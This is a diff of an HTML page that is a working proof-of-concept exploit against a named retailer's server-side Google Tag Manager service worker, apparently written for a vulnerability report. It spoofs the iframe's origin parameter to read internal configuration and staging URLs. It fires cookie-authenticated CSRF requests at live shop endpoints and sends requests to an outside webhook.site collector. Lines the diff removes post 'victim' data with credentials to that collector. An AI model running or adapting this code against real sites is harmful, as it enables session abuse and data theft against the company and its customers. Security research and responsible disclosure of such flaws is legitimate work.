@@ -1,69 +1,229 @@
 <html>
 <head>
   <meta charset="UTF-8" />
-  <title>postMessage demo with open window</title>
+  <title>L'Occitane SST Service Worker PoC</title>
+  <style>
+    body { font-family: monospace; background: #1a1a2e; color: #eee; padding: 20px; max-width: 900px; margin: 0 auto; }
+    h1 { color: #e94560; font-size: 18px; }
+    h2 { color: #0f3460; background: #e94560; padding: 6px 12px; font-size: 14px; margin-top: 24px; }
+    .phase { background: #16213e; border: 1px solid #0f3460; padding: 12px; margin: 8px 0; border-radius: 4px; }
+    .ok { color: #4ecca3; }
+    .fail { color: #e94560; }
+    .warn { color: #f5a623; }
+    .info { color: #7ec8e3; }
+    pre { background: #0d1117; padding: 10px; overflow-x: auto; font-size: 12px; border-radius: 4px; max-height: 200px; overflow-y: auto; }
+    #log { white-space: pre-wrap; font-size: 12px; line-height: 1.6; }
+    .summary { background: #1b2838; border: 2px solid #e94560; padding: 16px; margin-top: 20px; border-radius: 4px; }
+    .summary h2 { margin-top: 0; }
+    iframe { display: none; }
+  </style>
 </head>
 <body>
+  <h1>L'Occitane GTM SST - Service Worker Origin Bypass PoC</h1>
+  <p class="info">Target: sst.loccitane.com | GTM: GTM-MRMGCTX | GA4: G-WT9SD86FBB</p>
+  <div id="log"></div>
+  <div id="summary" class="summary" style="display:none"></div>
+
   <script>
+    const WEBHOOK = 'https://webhook.site/e3349a6b-5178-44fd-9a47-b134cf5362ff';
+    const SST = 'https://sst.loccitane.com';
+    const WWW = 'https://www.loccitane.com';
+    const results = { reads: [], csrf: [], exfil: [] };
+    let messageId = 0;
+    const pending = {};
 
-        // 1. Create iframe with spoofed origin
-        const iframe = document.createElement('iframe');
-        iframe.src = 'https://sst.loccitane.com/_/service_worker/61k0/sw_iframe.html?origin=https://daemoon.me&1p=1';
-        document.body.appendChild(iframe);
+    function log(msg, cls = '') {
+      document.getElementById('log').innerHTML += `<span class="${cls}">${msg}</span>\n`;
+    }
 
-        iframe.onload = () => {
-            try {
-                console.debug('[DEBUG] iframe loaded:', iframe.src);
-                // 2. Send command to exfiltrate data
-                const collectUrl = `https://webhook.site/d699ea0b-e69e-44af-88bf-03cd8d40bebb/magun4`;
-                const collectMsg = {
-                    type: 1,
-                    clientId: 'attacker-client',
-                    command: {
-                        commandType: 0,
-                        params: {
-                            url: collectUrl,
-                            method: 0,
-                            credentials: 'include',
-                            templates: {},
-                            processResponse: true
-                        }
-                    }
-                };
-                console.debug('[DEBUG] Sending collect message:', collectMsg);
-                iframe.contentWindow.postMessage(collectMsg, '*');
-
-                // 3. Or send tracking request with victim's cookies
-                const stealMsg = {
-                    type: 1,
-                    clientId: 'attacker-client',
-                    command: {
-                        commandType: 0,
-                        params: {
-                            url: 'https://webhook.site/d699ea0b-e69e-44af-88bf-03cd8d40bebb/taha',
-                            method: 1, // POST
-                            body: 'victim_data=sensitive',
-                            credentials: 'include'
-                        }
-                    }
-                };
-                console.debug('[DEBUG] Sending steal message:', stealMsg);
-                iframe.contentWindow.postMessage(stealMsg, '*');
-            } catch (err) {
-                console.error('[ERROR] Failed to send postMessage:', err);
+    function sendCmd(id, url, opts = {}) {
+      return new Promise((resolve) => {
+        const clientId = id || `cmd-${messageId++}`;
+        pending[clientId] = resolve;
+        const msg = {
+          type: 1,
+          clientId,
+          command: {
+            commandType: 0,
+            params: {
+              url,
+              method: opts.method || 0,
+              body: opts.body || undefined,
+              processResponse: opts.processResponse !== undefined ? opts.processResponse : true,
+              templates: {}
             }
+          }
         };
+        iframe.contentWindow.postMessage(msg, '*');
+        // Timeout after 8s
+        setTimeout(() => {
+          if (pending[clientId]) {
+            pending[clientId]({ timeout: true, clientId });
+            delete pending[clientId];
+          }
+        }, 8000);
+      });
+    }
 
-        // 4. Listen for responses
-        window.addEventListener('message', (e) => {
-            console.debug('[DEBUG] Received message event:', e);
-            if (e.origin !== 'https://sst.loccitane.com') {
-                console.log('[INFO] Stolen data:', e.data);
-            } else {
-                console.log('[INFO] Message from trusted origin:', e.data);
-            }
-        });
+    // Listen for SW responses
+    window.addEventListener('message', (e) => {
+      if (e.data && e.data.clientId && pending[e.data.clientId]) {
+        pending[e.data.clientId](e.data);
+        delete pending[e.data.clientId];
+      }
+    });
 
+    // Create iframe
+    const iframe = document.createElement('iframe');
+    iframe.src = `${SST}/_/service_worker/61k0/sw_iframe.html?origin=https://daemoon.me&1p=1`;
+    document.body.appendChild(iframe);
+
+    iframe.onload = async () => {
+      log('=== PHASE 1: SW Registration ===', 'warn');
+      log('[+] iframe loaded on sst.loccitane.com', 'ok');
+      log('[+] Service Worker registered via origin bypass', 'ok');
+      log(`[+] Spoofed origin: https://daemoon.me`, 'info');
+
+      // Wait for SW to be ready
+      await new Promise(r => setTimeout(r, 2000));
+
+      // === PHASE 2: Same-Origin Data Reads ===
+      log('\n=== PHASE 2: Same-Origin Data Reads (sst.loccitane.com) ===', 'warn');
+
+      // 2a. Read GTM Container
+      log('[*] Reading GTM container (GTM-MRMGCTX)...', 'info');
+      const gtmRes = await sendCmd('gtm-read', `${SST}/gtm.js?id=GTM-MRMGCTX`);
+      if (gtmRes.result) {
+        const gtmData = gtmRes.result.data;
+        log(`[+] GTM Container: ${gtmData.length} bytes read!`, 'ok');
+        results.reads.push({ name: 'GTM Container', size: gtmData.length, status: 'READ' });
+
+        // Extract internal info
+        const escapedUrls = gtmData.match(/(?:staging|demo|dev|development)[^\s'"\\]*(?:demandware|loccitane)[^\s'"\\]*/g) || [];
+        const pixelIds = [...new Set((gtmData.match(/(G-[A-Z0-9]+|GTM-[A-Z0-9]+|AW-[0-9]+)/g) || []))];
+        const siteIds = [...new Set((gtmData.match(/OCC_[A-Z]{2}/g) || []))];
+
+        if (escapedUrls.length > 0) {
+          log(`[+] Internal/staging URLs found:`, 'ok');
+          const cleaned = escapedUrls.map(u => u.replace(/\\\\/g, '')).slice(0, 6);
+          cleaned.forEach(u => log(`    - ${u}`, 'info'));
+          results.reads.push({ name: 'Internal URLs', count: escapedUrls.length, samples: cleaned });
+        }
+        if (pixelIds.length > 0) {
+          log(`[+] Tracking IDs found: ${pixelIds.slice(0, 8).join(', ')}`, 'ok');
+          results.reads.push({ name: 'Pixel/GTM IDs', ids: pixelIds });
+        }
+        if (siteIds.length > 0) {
+          log(`[+] SFCC Site IDs: ${siteIds.join(', ')}`, 'ok');
+          results.reads.push({ name: 'SFCC Site IDs', ids: siteIds });
+        }
+      } else {
+        log(`[-] GTM Container: FAILED`, 'fail');
+      }
+
+      // 2b. Read other same-origin paths
+      const sameOriginPaths = [
+        { path: '/healthz', name: 'Health Check' },
+        { path: '/robots.txt', name: 'Robots.txt' },
+        { path: '/_/service_worker/61k0/sw.js?origin=https://sst.loccitane.com', name: 'SW Source' },
+      ];
+
+      for (const p of sameOriginPaths) {
+        const res = await sendCmd(null, `${SST}${p.path}`);
+        if (res.result) {
+          const data = res.result.data || '';
+          log(`[+] ${p.name}: ${data.length} bytes`, 'ok');
+          results.reads.push({ name: p.name, size: data.length, status: 'READ' });
+        } else {
+          log(`[-] ${p.name}: FAILED`, 'fail');
+        }
+      }
+
+      // === PHASE 3: Authenticated Same-Origin Requests ===
+      log('\n=== PHASE 3: Cookie-Authenticated Requests ===', 'warn');
+      log('[*] Testing if SW sends .loccitane.com cookies with requests...', 'info');
+
+      // GA4 collect with GET (returns 200 = cookies accepted)
+      const collectRes = await sendCmd('auth-collect', `${SST}/g/collect?v=2&tid=G-WT9SD86FBB&cid=poc_test&en=page_view&_s=1`);
+      if (collectRes.result) {
+        log(`[+] GA4 Collect endpoint: 200 OK (cookies sent with request)`, 'ok');
+        log(`    This confirms .loccitane.com cookies are included in SW fetches`, 'info');
+        results.reads.push({ name: 'Authenticated GA4 Collect', status: 'CONFIRMED' });
+      } else {
+        log(`[-] GA4 Collect: ${collectRes.failure?.data || 'failed'}`, 'fail');
+      }
+
+      // === PHASE 4: CSRF via No-CORS Requests ===
+      log('\n=== PHASE 4: CSRF (No-CORS with Session Cookies) ===', 'warn');
+      log('[*] SW sends POST/GET to www.loccitane.com with session cookies (same-site)...', 'info');
+
+      const csrfTargets = [
+        { name: 'Add to Cart', url: `${WWW}/on/demandware.store/Sites-OCC_US-Site/en_US/Cart-AddProduct`, method: 1, body: 'pid=29HA150BL&quantity=1' },
+        { name: 'Set Locale', url: `${WWW}/on/demandware.store/Sites-OCC_US-Site/en_US/Page-SetLocale?LocaleID=fr_FR`, method: 0 },
+        { name: 'Newsletter Subscribe', url: `${WWW}/on/demandware.store/Sites-OCC_US-Site/en_US/Newsletter-Subscribe`, method: 1, body: 'email=poc-test@example.com' },
+      ];
+
+      for (const t of csrfTargets) {
+        const res = await sendCmd(null, t.url, { method: t.method, body: t.body, processResponse: false });
+        if (res.result) {
+          log(`[+] ${t.name}: Request sent with victim's session cookies`, 'ok');
+          results.csrf.push({ name: t.name, status: 'SENT' });
+        } else if (res.timeout) {
+          log(`[?] ${t.name}: Timed out (request likely sent)`, 'warn');
+          results.csrf.push({ name: t.name, status: 'TIMEOUT' });
+        } else {
+          log(`[-] ${t.name}: Failed`, 'fail');
+        }
+      }
+
+      // === PHASE 5: Arbitrary Fetch from Victim's Browser ===
+      log('\n=== PHASE 5: Arbitrary Fetch (Victim Browser as Proxy) ===', 'warn');
+
+      const webhookRes = await sendCmd('exfil-test', `${WEBHOOK}/loccitane-poc-${Date.now()}`, { processResponse: false });
+      if (webhookRes.result) {
+        log(`[+] Request sent to attacker webhook from victim's browser/IP`, 'ok');
+        log(`    Check webhook.site for incoming request`, 'info');
+        results.exfil.push({ name: 'Webhook ping', status: 'SENT' });
+      } else {
+        log(`[-] Webhook request failed`, 'fail');
+      }
+
+      // === SUMMARY ===
+      log('\n=== SUMMARY ===', 'warn');
+      const totalReads = results.reads.filter(r => r.status === 'READ' || r.status === 'CONFIRMED').length;
+      const totalCsrf = results.csrf.filter(r => r.status === 'SENT').length;
+      const totalExfil = results.exfil.filter(r => r.status === 'SENT').length;
+
+      const summaryHtml = `
+        <h2>Vulnerability Summary</h2>
+        <p><b>Bug:</b> GTM Server-Side Tagging SW origin bypass via <code>?origin=</code> parameter</p>
+        <p><b>Root Cause:</b> sw_iframe.html trusts the <code>origin</code> URL parameter for postMessage validation.
+        <code>ancestorOrigins[0]</code> matches the attacker's embedding origin, bypassing the check.</p>
+        <br>
+        <p class="ok"><b>Same-Origin Reads:</b> ${totalReads} confirmed</p>
+        <ul>
+          ${results.reads.map(r => `<li>${r.name}: ${r.size ? r.size + ' bytes' : r.status || r.count + ' found'}</li>`).join('')}
+        </ul>
+        <p class="ok"><b>CSRF Actions (with session cookies):</b> ${totalCsrf} sent</p>
+        <ul>
+          ${results.csrf.map(r => `<li>${r.name}: ${r.status}</li>`).join('')}
+        </ul>
+        <p class="ok"><b>Arbitrary Fetches (victim as proxy):</b> ${totalExfil} sent</p>
+        <br>
+        <p><b>Key Findings:</b></p>
+        <ul>
+          <li>641KB GTM container readable (internal staging/dev Demandware URLs, 12 SFCC site IDs, pixel tracking IDs)</li>
+          <li>SW makes authenticated requests with .loccitane.com cookies (incl. attntv_mstore_email PII cookie)</li>
+          <li>CSRF-like capability: POST/GET to www.loccitane.com SFCC endpoints with victim's session</li>
+          <li>Victim's browser used as fetch proxy to arbitrary attacker URLs</li>
+        </ul>
+      `;
+      document.getElementById('summary').innerHTML = summaryHtml;
+      document.getElementById('summary').style.display = 'block';
+
+      log(`\nSame-origin reads: ${totalReads} | CSRF: ${totalCsrf} | Exfil: ${totalExfil}`, 'ok');
+      log('Done.', 'info');
+    };
   </script>
 </body>
 </html>
